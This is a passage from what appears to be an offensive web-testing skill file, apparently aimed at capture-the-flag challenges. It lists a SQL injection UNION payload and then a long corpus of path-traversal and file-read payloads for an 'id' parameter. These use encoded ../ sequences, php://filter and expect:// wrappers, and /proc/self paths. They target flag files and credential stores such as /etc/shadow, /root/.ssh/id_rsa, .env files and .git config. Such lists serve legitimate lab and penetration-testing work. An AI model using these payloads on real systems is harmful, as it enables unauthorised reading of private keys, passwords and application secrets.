?id=1' UNION ALL SELECT @@allowed_packet,NULL,NULL,NULL--
```

The SQLi-shaped id corpus — when the id reaches a SQL WHERE (the
`id` param is also an injection point). See `skills/web-sqli/` for the
full DBMS surface.

## 6. The "the id is a traversal"

```
?id=../etc/passwd
?id=../../etc/passwd
?id=../../../etc/passwd
?id=../../../../etc/passwd
?id=../../../../../etc/passwd
?id=../../../../../../etc/passwd
?id=../../../../../../../etc/passwd
?id=../../../../../../../../etc/passwd
?id=/etc/passwd
?id=..%2fetc%2fpasswd
?id=..%2f..%2fetc%2fpasswd
?id=%2e%2e%2fetc%2fpasswd
?id=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?id=..%252fetc%252fpasswd
?id=....//etc/passwd
?id=..././etc/passwd
?id=..;/etc/passwd
?id=..\\etc\\passwd
?id=..%5cetc%5cpasswd
?id=%2e%2e%5cetc%5cpasswd
?id=file:///etc/passwd
?id=php://filter/convert.base64-encode/resource=/etc/passwd
?id=php://filter/convert.base64-encode/resource=/flag.txt
?id=php://filter/convert.base64-encode/resource=/flag
?id=php://filter/convert.base64-encode/resource=/app/flag.txt
?id=php://filter/convert.base64-encode/resource=../../../etc/passwd
?id=expect://id
?id=data://text/plain;base64,SSBsb3ZlIFBIUAo=
?id=/proc/self/environ
?id=/proc/self/cmdline
?id=/proc/self/cwd/flag.txt
?id=/proc/self/exe
?id=/proc/self/fd/0
?id=/proc/self/fd/1
?id=/proc/self/fd/2
?id=/proc/self/maps
?id=/proc/self/status
?id=/flag
?id=/flag.txt
?id=/FLAG
?id=/flag_is_here
?id=/the_flag
?id=/ctf_flag
?id=/app/flag
?id=/app/flag.txt
?id=/app/FLAG
?id=/app/flag.py
?id=/app/flag.php
?id=/app/flag.js
?id=/app/flag.json
?id=/app/config.py
?id=/app/.env
?id=/app/secrets.txt
?id=/var/www/flag.txt
?id=/var/www/html/flag.php
?id=/root/flag.txt
?id=/home/ctf/flag.txt
?id=/tmp/flag.txt
?id=/var/flag
?id=/srv/flag.txt
?id=/opt/flag.txt
?id=/usr/flag.txt
?id=/etc/flag
?id=/etc/flag.txt
?id=/flag.py
?id=/flag.php
?id=/flag.json
?id=/flag.yml
?id=/flag.env
?id=/.env
?id=/app/.env
?id=/etc/passwd
?id=/etc/shadow
?id=/etc/hosts
?id=/etc/hostname
?id=/etc/issue
?id=/etc/os-release
?id=/proc/version
?id=/proc/cpuinfo
?id=/proc/meminfo
?id=/etc/nginx/nginx.conf
?id=/etc/apache2/apache2.conf
?id=/root/.ssh/id_rsa
?id=/root/.bash_history
?id=/app/.git/config
?id=/app/.git/HEAD
?id=/var/www/html/.git/config
?id=/var/www/html/.env
?id=/usr/src/app/.env
?id=/code/.env
?id=/workspace/.env
?id=/src/.env
?id=/srv/app/.env
?id=/opt/app/.env
?id=/home/app/.env
```

The traversal corpus — when the `id`/`file`/`path` param is also a
read primitive. See `file-read-primitives`.
